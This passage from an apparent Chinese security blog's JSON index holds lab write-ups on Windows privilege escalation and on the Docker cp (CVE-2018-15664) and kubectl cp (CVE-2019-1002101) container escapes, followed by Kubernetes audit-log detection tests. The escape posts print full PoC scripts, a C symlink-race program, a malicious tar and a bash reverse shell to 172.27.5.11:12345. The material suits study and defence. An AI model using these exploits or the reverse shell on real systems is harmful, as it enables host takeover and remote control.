Windows操作系统配置错误提权系统服务配置错误提权介绍Windwos系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。如果一个低权限的用户对这类系统服务的可执行文件具有写权限，就可以将其替换成任意可执行文件，并随着系统服务的启动获得系统权限。 系统服务权限配置错误有两种可能： 服务未运行，攻击者会使用任意服务替换原来的服务，然后重启服务 服务正在运行且无法终止，这种情况适用于绝大多数漏洞利用场景，攻击者通常会利用DLL劫持技术并尝试和重启服务来提权 实战演练 首先获取了一个shell，具有普通用户权限 利用exploit/windows/local/service_permissions模块进行检查，选择AGGRESSIVE选项，可以利用目标机器每一个有缺陷的服务。 可信任服务路径漏洞介绍Windows服务通常是以System权限运行的，所以系统在解析服务所对应的文件路径中的空格会以系统权限运行。 例如：有个文件路径”C:\\Program Files\\Some Folder\\Service.exe” 则对于每一个空格，Windows都会尝试寻找并执行与空格前面名字相匹配的程序，操作系统会对你路径中空格的所有可能情况进行尝试，直到一个能匹配的程序。 C:\\Program.exe C:\\Progarm Files\\Some.exe 如果一个按上述规则命名的可执行程序上传到受影响的目录中，那么服务一旦重启，则会以System权限运行。 漏洞利用可能的情况： 如果该路径与服务相关，就会任意创建一个服务或者Service模板 如果路径与可执行文件有关，就任意创建一个可执行文件 注册表键AlwaysInstallElevated介绍注册表键AlwaysInstallElevated是一个策略设置项，如果启用了，任何权限的用户都能以NT AUTHORITY\\SYSTEM权限来安装恶意的MSI文件。 组策略首选项提权介绍管理员在域中新建组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了该组策略更新后的密码，使用AES-256加密。但是微软在2012年公布了AES-256的私钥，导致保存在XML文件中的密码可以被解密。在SYSVOL中可以找到包含cpassword的XML文件。 绕过UAC提权介绍在权限不够的情况下，访问系统盘的根目录，Windows目录、Program Files目录，以及读写系统登录数据库等操作都要进行UAC的认证才能进行。 实战演练 首先获取一个shell，权限是普通用户权限，但是该用户必须在管理员组中，并且设置UAC为仅在程序试图更改我的计算机时通知我。 接着使用exploit/windows/local/bypassuac模块，配置好选项后运行发现成功绕过，获取SYSTEM权限 令牌窃取提权介绍这个提权方式是针对Kerberos协议，通过入侵服务器，在客户端登录时窃取客户端的令牌，从而获取其权限。但前提是需要获取SYSTEM权限的令牌。 总结本篇文章总结了常见的Windows提权方式。","link":"/2023/06/06/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"title":"CVE-2018-15664 利用符号链接容器逃逸","text":"影响版本Docker &lt;= 18.06.1-ce-rc2 Docker cpDocker cp命令能够将容器内的文件向宿主机复制，也能够实现宿主机文件向容器中复制。 12# 将容器中的文件复制到宿主机中docker cp container_id:file_path_in_container host_path 符号链接类似于Windows中的快捷方式。符号链接的操作是透明的：对符号链接文件进行读写的程序会表现得直接对目标文件进行操作。 12# 将目标路径和指定的链接名或者路径进行绑定ln -s targrt_path link_path 源码及利用原理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143// Copyright 2012 The Go Authors. All rights reserved.// Use of this source code is governed by a BSD-style// license that can be found in the LICENSE.BSD file.// This code is a modified version of path/filepath/symlink.go from the Go standard library.package symlinkimport ( &quot;bytes&quot; &quot;errors&quot; &quot;os&quot; &quot;path/filepath&quot; &quot;strings&quot; &quot;github.com/docker/docker/pkg/system&quot;)// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an// absolute path. This function handles paths in a platform-agnostic manner.func FollowSymlinkInScope(path, root string) (string, error) { path, err := filepath.Abs(filepath.FromSlash(path)) if err != nil { return &quot;&quot;, err } root, err = filepath.Abs(filepath.FromSlash(root)) if err != nil { return &quot;&quot;, err } return evalSymlinksInScope(path, root)}// evalSymlinksInScope will evaluate symlinks in `path` within a scope `root` and return// a result guaranteed to be contained within the scope `root`, at the time of the call.// Symlinks in `root` are not evaluated and left as-is.// Errors encountered while attempting to evaluate symlinks in path will be returned.// Non-existing paths are valid and do not constitute an error.// `path` has to contain `root` as a prefix, or else an error will be returned.// Trying to break out from `root` does not constitute an error.//// Example:// If /foo/bar -&gt; /outside,// FollowSymlinkInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;) == &quot;/foo/outside&quot; instead of &quot;/oustide&quot;//// IMPORTANT: it is the caller's responsibility to call evalSymlinksInScope *after* relevant symlinks// are created and not to create subsequently, additional symlinks that could potentially make a// previously-safe path, unsafe. Example: if /foo/bar does not exist, evalSymlinksInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;)// would return &quot;/foo/bar&quot;. If one makes /foo/bar a symlink to /baz subsequently, then &quot;/foo/bar&quot; should// no longer be considered safely contained in &quot;/foo&quot;.func evalSymlinksInScope(path, root string) (string, error) { root = filepath.Clean(root) if path == root { return path, nil } if !strings.HasPrefix(path, root) { return &quot;&quot;, errors.New(&quot;evalSymlinksInScope: &quot; + path + &quot; is not in &quot; + root) } const maxIter = 255 originalPath := path // given root of &quot;/a&quot; and path of &quot;/a/b/../../c&quot; we want path to be &quot;/b/../../c&quot; path = path[len(root):] if root == string(filepath.Separator) { path = string(filepath.Separator) + path } if !strings.HasPrefix(path, string(filepath.Separator)) { return &quot;&quot;, errors.New(&quot;evalSymlinksInScope: &quot; + path + &quot; is not in &quot; + root) } path = filepath.Clean(path) // consume path by taking each frontmost path element, // expanding it if it's a symlink, and appending it to b var b bytes.Buffer // b here will always be considered to be the &quot;current absolute path inside // root&quot; when we append paths to it, we also append a slash and use // filepath.Clean after the loop to trim the trailing slash for n := 0; path != &quot;&quot;; n++ { if n &gt; maxIter { return &quot;&quot;, errors.New(&quot;evalSymlinksInScope: too many links in &quot; + originalPath) } // find next path component, p i := strings.IndexRune(path, filepath.Separator) var p string if i == -1 { p, path = path, &quot;&quot; } else { p, path = path[:i], path[i+1:] } if p == &quot;&quot; { continue } // this takes a b.String() like &quot;b/../&quot; and a p like &quot;c&quot; and turns it // into &quot;/b/../c&quot; which then gets filepath.Cleaned into &quot;/c&quot; and then // root gets prepended and we Clean again (to remove any trailing slash // if the first Clean gave us just &quot;/&quot;) cleanP := filepath.Clean(string(filepath.Separator) + b.String() + p) if cleanP == string(filepath.Separator) { // never Lstat &quot;/&quot; itself b.Reset() continue } fullP := filepath.Clean(root + cleanP) fi, err := os.Lstat(fullP) if os.IsNotExist(err) { // if p does not exist, accept it b.WriteString(p) b.WriteRune(filepath.Separator) continue } if err != nil { return &quot;&quot;, err } if fi.Mode()&amp;os.ModeSymlink == 0 { b.WriteString(p + string(filepath.Separator)) continue } // it's a symlink, put it at the front of path dest, err := os.Readlink(fullP) if err != nil { return &quot;&quot;, err } if system.IsAbs(dest) { b.Reset() } path = dest + string(filepath.Separator) + path } // see note above on &quot;fullP := ...&quot; for why this is double-cleaned and // what's happening here return filepath.Clean(root + filepath.Clean(string(filepath.Separator)+b.String())), nil}// EvalSymlinks returns the path name after the evaluation of any symbolic// links.// If path is relative the result will be relative to the current directory,// unless one of the components is an absolute symbolic link.// This version has been updated to support long paths prepended with `\\\\?\\`.func EvalSymlinks(path string) (string, error) { return evalSymlinks(path)} Docker cp过程中FolllowSyslinkInScope方法会先检测路径合法存在，检测结束后evalSymlinkInScope方法对路径进行解析并执行后续文件复制操作。 整个复制过程不是一个原子操作，而路径检测和解析执行才分别是原子操作。在这个复制过程中如果攻击者在路径检测结束后将正常路径替换成一个恶意的符号链接，那么攻击者将能够对Docker cp的目的主机（可以是容器也可以是宿主机）任意路径的文件内容进行覆盖。 然而这里我也有个猜测，Docker cp相当于一个set-uid进程，于是它可以获得文件root权限进行文件内容覆盖。 漏洞场景和POC解读漏洞场景：受害者在从容器中复制文件到宿主机当漏洞触发时容器内的文件将被复制到宿主机中的任意一个目录（恶意符号链接所指定） 12345678910111213141516171819202122232425262728293031323334353637#!/bin/zsh# Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;## This program is free software: you can redistribute it and/or modify# it under the terms of the GNU General Public License as published by# the Free Software Foundation, either version 3 of the License, or# (at your option) any later version.## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;.SYMSWAP_PATH=/totally_safe_pathSYMSWAP_TARGET=/w00t_w00t_im_a_flag# Create our flag.echo &quot;SUCCESS -- COPIED FROM THE HOST&quot; | sudo tee &quot;$SYMSWAP_TARGET&quot;sudo chmod 000 &quot;$SYMSWAP_TARGET&quot;# Run and build the malicious image.docker build -t cyphar/symlink_swap \\ --build-arg &quot;SYMSWAP_PATH=$SYMSWAP_PATH&quot; \\ --build-arg &quot;SYMSWAP_TARGET=$SYMSWAP_TARGET&quot; build/ctr_id=$(docker run --rm -d cyphar/symlink_swap &quot;$SYMSWAP_PATH&quot;)# Now continually try to copy the files.idx=0while truedo mkdir &quot;ex${idx}&quot; docker cp &quot;${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET&quot; &quot;ex${idx}/out&quot; idx=$(($idx + 1))done 漏洞场景：受害者在从宿主机中复制文件到容器中当漏洞触发时宿主机内的文件将被复制到宿主机中的任意一个目录（容器中恶意符号链接所指定） 123456789101112131415161718192021222324252627282930313233343536#!/bin/zsh# Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;## This program is free software: you can redistribute it and/or modify# it under the terms of the GNU General Public License as published by# the Free Software Foundation, either version 3 of the License, or# (at your option) any later version.## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;.SYMSWAP_PATH=/totally_safe_pathSYMSWAP_TARGET=/w00t_w00t_im_a_flag# Create our flag.echo &quot;FAILED -- HOST FILE UNCHANGED&quot; | sudo tee &quot;$SYMSWAP_TARGET&quot;sudo chmod 0444 &quot;$SYMSWAP_TARGET&quot;# Run and build the malicious image.docker build -t cyphar/symlink_swap \\ --build-arg &quot;SYMSWAP_PATH=$SYMSWAP_PATH&quot; \\ --build-arg &quot;SYMSWAP_TARGET=$SYMSWAP_TARGET&quot; build/ctr_id=$(docker run --rm -d cyphar/symlink_swap &quot;$SYMSWAP_PATH&quot;)echo &quot;SUCCESS -- HOST FILE CHANGED&quot; | tee localpath# Now continually try to copy the files.while truedo docker cp localpath &quot;${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET&quot;done POC解读POC中使用一个无限循环将恶意符号链接与正常文件交换，根据目标文件内容可以判定我们是否竞争成功。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/* * Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt; * * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;. */#define _GNU_SOURCE#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;#define usage() \\ do { printf(&quot;usage: symlink_swap &lt;symlink&gt;\\n&quot;); exit(1); } while(0)#define bail(msg) \\ do { perror(&quot;symlink_swap: &quot; msg); exit(1); } while (0)/* No glibc wrapper for this, so wrap it ourselves. */#define RENAME_EXCHANGE (1 &lt;&lt; 1)/*int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags){ return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);}*//* usage: symlink_swap &lt;symlink&gt; */int main(int argc, char **argv){ if (argc != 2) usage(); char *symlink_path = argv[1]; char *stash_path = NULL; if (asprintf(&amp;stash_path, &quot;%s-stashed&quot;, symlink_path) &lt; 0) bail(&quot;create stash_path&quot;); /* Create a dummy file at symlink_path. */ struct stat sb = {0}; if (!lstat(symlink_path, &amp;sb)) { int err; if (sb.st_mode &amp; S_IFDIR) err = rmdir(symlink_path); else err = unlink(symlink_path); if (err &lt; 0) bail(&quot;unlink symlink_path&quot;); } /* * Now create a symlink to &quot;/&quot; (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(&quot;/&quot;, symlink_path) &lt; 0) bail(&quot;create symlink_path&quot;); if (mkdir(stash_path, 0755) &lt; 0) bail(&quot;mkdir stash_path&quot;); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = renameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err &lt; 0) perror(&quot;symlink_swap: rename exchange failed&quot;); } return 0;} 漏洞复现这里使用metarget靶场进行漏洞测试。 正常操作将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将容器中的ex复制到宿主机的当前目录下。 恶意操作将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，在evalSymlinksInScope方法对这个路径进行解析之前将路径替换为恶意符号链接指向宿主机的/w00t_w00t_im_a_flag。执行的结果是将/w00t_w00t_im_a_flag文件复制到宿主机当前目录下。 运行run_read.sh，并通过grep查看是否写入成功。 非常夸张的是在竞争中获得root的主机访问权限&lt;1%,但仍有机会竞争成功。 正常操作要将宿主机的正常文件localpath复制到容器中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将宿主机的当前目录的localpath复制到容器中的/w00t_w00t_im_a_flag位置。 恶意操作我们在容器中创建了一个指向宿主机根目录/的恶意符号链接，在进行FollowSymlinkInScope方法时，对正常文件localpath进行检查，但在evalSymlinksInScope方法中传入的路径为指向宿主机根目录/的恶意符号链接。执行的结果是将宿主机的当前目录的localpath复制到宿主机/w00t_w00t_im_a_flag位置。 运行run_write.sh 我们发现这很快就完成了竞争， 这是因为 Docker 内部有一个**”chrootarchive”概念**，其中存档是从 chroot 中提取的。然而，Docker 不会 chroot 到容器的”/“（这会使此漏洞无效），而是 chroot 到存档目标的父目录——这是攻击者控制的。结果，这实际上导致攻击更有可能成功（一旦 chroot 完成竞争，其余的攻击就保证成功）。 参考链接：CVE-2018-15664：符号链接替换漏洞","link":"/2023/09/12/CVE-2018-15664%20%E5%88%A9%E7%94%A8%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"title":"CVE-2019-1002101 kubectl cp容器逃逸","text":"漏洞简介Twistlock的流程图很好的解释了kubectl cp漏洞的利用链及其原理。 启动一个被破坏或者恶意的容器 攻击者准备一个恶意的tar包（包含恶意软链接，例如：./baddir/twist-&gt;/proc/self/cwd） 此时容器中的二进制tar包被替换成恶意tar包 用户运行kubectl cp将文件从容器传输到宿主机 kubectl提取恶意tar包中的文件（此时会解析其中的恶意软链接，即写入到宿主机的 /proc/self/cwd 路径） 攻击者可以控制恶意软链接，将文件写到宿主机任意位置 影响范围Redhat Openshift_Container_Platform 3.10 Kubernetes 1.14.0 Redhat Openshift_Container_Platform 3.11 1.12.0 &lt;= Kubernetes &lt; 1.12.7 Redhat Openshift_Container_Platform 3.9 1.13.0 &lt;= Kubernetes &lt; 1.13.5 1.11.0 &lt;= Kubernetes &lt; 1.11.9 漏洞复现实验环境Kubernetes 1.11.1 实验过程环境配置 使用Metarget创建单节点k8s集群 1./metarget cnv install cve-2019-1002101 --domestic 可以看到单节点集群环境安装成功（需要使用--domestic安装单节点k8s集群） 创建一个Pod并运行Nginx容器，查看运行状态 1kubectl run nginx --image=nginx brompwnie的做法 首先从github中获取我们需要的三个文件 使用kubectl cp将文件传输到容器中（这样传文件比较方便） 注意：createPwnTar.sh中需要修改反弹shell命令中的x.x.x.x/端口为攻击机的ip和端口 123kubectl cp /home/safedog/setupTar.sh nginx-64f497f8fd-wdsg2:.kubectl cp /home/safedog/badbin nginx-64f497f8fd-wdsg2:.kubectl cp /home/safedog/createPwnTar.sh nginx-64f497f8fd-wdsg2:. 赋予三个文件执行权限 1chmod +x badbin setupTar.sh createPwnTar.sh 依次执行createPwnTar.sh和setupTar.sh 12./createPwnTar.sh./setupTar.sh 攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，之后只要在植入的路径打开终端便能够反弹shell 宿主机执行kubectl cp命令 宿主机在路径下打开终端，攻击机获取反弹shell h4ckm310n的做法 使用kubectl进入容器命令行，进行恶意tar包构造 1kubectl exec -it nginx-64f497f8fd-wdsg2 -- /bin/bash 在当前目录下创建了一个名为 badbin 的符号链接，指向系统的 /bin 目录。 1ln -s /bin ./badbin 这个步骤将 /bin 目录的符号链接badbin一起打包到了 malicious.tar 中。 1tar -cf malicious.tar ./badbin 这个命令尝试删除当前目录下的 ./badbin 目录。但由于 ./badbin 是一个符号链接，删除操作不会影响到 /bin 目录，因为它只会删除链接而不会删除链接指向的目录。 1rm -f ./badbin 这个命令在当前目录下创建了一个名为 ./badbin 的新目录。 1mkdir ./badbin 这个命令使用 echo 将一段脚本写入 ./badbin/ls 文件。这段脚本实际上是一个简单的反向 shell，它试图连接到 IP 地址 172.27.5.11 的 TCP 端口 12345，并将命令执行的结果发送到该连接。这是一个潜在的恶意操作，可以用于入侵和远程控制目标系统。 1echo -e '#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/172.27.5.11/12345 0&gt;&amp;1' &gt; ./badbin/ls 这个命令将 ./badbin/ls 文件的执行权限设置为可执行。 1chmod +x ./badbin/ls 这个命令将新创建的 ./badbin/ls 文件添加到之前创建的 malicious.tar 归档文件中。 1tar -rf malicious.tar ./badbin/ls 创建恶意test文件，内容如下。 12#!/bin/bashcat /malicious.tar 将其替换到/bin/tar中。 12rm -rf /bin/tarcp test /bin/tar 攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，并执行ls命令触发反弹shell kali攻击机进行监听 1nc -lvvp 12345 宿主机执行 1kubectl cp nginx-64f497f8fd-wdsg2:test /home/safedog 宿主机执行kubectl cp成功后可以发现bin目录被携带下来 宿主机执行成功后执行ls命令，可以在攻击机上获取反弹的shell 总结思考检测方式 版本检测 根据漏洞影响的版本信息进行检测 敏感目录/bin/tar 监控异常指令修改/bin/tar目录导致漏洞利用 参考链接POC： https://github.com/brompwnie/CVE-2019-1002101-Helpers https://h4ckm310n.com/?p=528 漏洞通告： https://discuss.kubernetes.io/t/announce-security-release-of-kubernetes-kubectl-potential-directory-traversal-releases-1-11-9-1-12-7-1-13-5-and-1-14-0-cve-2019-1002101/5712","link":"/2023/10/09/CVE-2019-1002101%20kubectl%20cp%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"title":"Kubernetes日志审计策略-集群访问异常","text":"检测分析异常行为检测-集群角色拥有pod/exec权限 （或者拥有其他权限）测试项名称：异常行为检测-集群角色拥有pod/exec权限 测试内容：系统支持对集群异常行为进行检测 测试要求：能正常检测到入侵行为 测试步骤： 登录集群节点 创建集群角色 1kubectl apply role.yaml role.yaml文件内容如下 123456789apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: namespace: default name: rwildcardrules:- apiGroups: [&quot;&quot;] # &quot;&quot; indicates the core API group resources: [&quot;pods/exec&quot;] verbs: [&quot;create&quot;, &quot;get&quot;, &quot;watch&quot;, &quot;list&quot;] 登录容器安全平台,查看是否检测到该风险行为 开启日志审计功能准备审计文件 1vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml 审计rbac.authorization.k8s.io组中的roles资源的create动作 12345678910apiVersion: audit.k8s.io/v1kind: PolicyomitStages: - &quot;RequestReceived&quot;rules: - level: Request verbs: [&quot;create&quot;] resources: - group: rbac.authorization.k8s.io resources: [&quot;roles&quot;] 配置 API 服务器 1vim /etc/kubernetes/manifests/kube-apiserver.yaml 在 spec.containers.command 下添加命令： 12345- --audit-log-maxage=30- --audit-log-maxbackup=1- --audit-log-maxsize=100- --audit-log-path=/var/log/audit/kube-apiserver-audit.log- --audit-policy-file=/etc/kubernetes/audit-policy/apiserver-audit-policy.yaml 在 spec.containers.volumeMounts 下添加： 1234- mountPath: /var/log/audit name: audit-logs- mountPath: /etc/kubernetes/audit-policy name: audit-policy 在 spec.volumes 下添加： 12345678- hostPath: path: /var/log/kubernetes/audit type: &quot;&quot; name: audit-logs- hostPath: path: /etc/kubernetes/audit-policy type: &quot;&quot; name: audit-policy 日志分析查看日志 1cat /var/log/kubernetes/audit/kube-apiserver-audit.log 分析日志内容，并重点关注特征字段 match one match two “verbs”:[“create”,”get”,”watch”,”list”] “resources”:[“pods/exec”] 异常行为检测-绑定用户到集群管理员角色测试项名称：异常行为检测-绑定用户到集群管理员角色 测试内容：系统支持对集群异常访问进行监控 测试要求：能正常检测到异常行为 前置条件：已经根据页面帮助信息配置集群审计规则点击【设置】-【内置策略】开启对应报警 测试步骤： 登录集群master节点 执行如下命令： 将匿名用户绑定到管理员角色 1kubectl create clusterrolebinding root-cluster-admin-binding --clusterrole=cluster-admin --user=root 开启日志审计功能准备审计文件 1vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml 审计rbac.authorization.k8s.io组中的clusterrolebindings资源的create动作 12345678910apiVersion: audit.k8s.io/v1beta1kind: Policyrules:- level: Request users: [&quot;kubernetes-admin&quot;] userGroups: [&quot;system:masters&quot;,&quot;system:authenticated&quot;] verbs: [&quot;create&quot;] resources: - group: rbac.authorization.k8s.io resources: [&quot;clusterrolebindings&quot;] 日志分析查看日志 1cat /var/log/kubernetes/audit/kube-apiserver-audit.log 分析日志内容，并重点关注特征字段 match one match two match three “resource”: “clusterrolebindings” “kind”:”ClusterRoleBinding” “name”:”root” 异常行为检测-Secrets异常访问开启日志审计功能准备审计文件 1vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml 审计默认组中的secrets资源的list动作 1234567891011apiVersion: audit.k8s.io/v1beta1kind: PolicyomitStages: - &quot;RequestReceived&quot; - &quot;ResponseStarted&quot;rules:- level: RequestResponse verbs: [&quot;list&quot;] resources: - group: resources: [&quot;secrets&quot;] 日志分析查看日志 1cat /var/log/kubernetes/audit/kube-apiserver-audit.log 分析日志内容，并重点关注特征字段 match one match two match three “requestURI”:”/api/v1/secrets?limit=500” “description”:”Data contains the secret data “kubernetes.io/service-account-token”","link":"/2023/10/20/Kubernetes%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%AD%96%E7%95%A5-%E9%9B%86%E7%BE%A4%E8%AE%BF%E9%97%AE%E5%BC%82%E5%B8%B8/"}],"tags":[{"name":"应急响应","slug":"应急响应","link":"/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"安全加固","slug":"安全加固","link":"/tags/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"常见web漏洞","slug":"常见web漏洞","link":"/tags/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/"},{"name":"容器安全","slug":"容器安全","link":"/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"}],"categories":[]}